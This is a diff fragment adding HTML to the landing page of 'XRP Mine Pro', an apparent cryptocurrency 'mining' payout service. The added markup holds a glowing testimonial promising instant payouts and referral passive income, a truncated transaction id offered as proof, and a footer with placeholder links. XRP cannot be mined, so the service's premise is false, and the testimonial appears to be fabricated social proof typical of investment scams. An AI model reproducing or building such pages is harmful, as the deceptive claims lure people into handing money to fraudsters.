+            <p class="quote">"I've been using XRP Mine Pro for 6 months and the payouts are instant. The passive income from the referral program is a huge bonus! Highly recommend."</p>
+            <div class="author">
+                Samantha B. (USA)
+                <span class="txn-id">Last Payout TXN: 5b7d...c4f8</span>
+            </div>
+        </div>
+    </section>
+    
+    <footer>
+        <p>&copy; 2025 XRP Mine Pro. All rights reserved.</p>
+        <div style="margin: 15px 0;">
+            <a href="#"><i class="fab fa-telegram-plane"></i></a>
+            <a href="#"><i class="fas fa-envelope"></i></a>
+        </div>
+        <div class="legal-links">
+            <a href="#">Privacy Policy</a> |
+            <a href="#">Terms of Service</a> |
+            <a href="#">FAQ</a>
+        </div>
+    </footer>
 
 </body>
 </html>
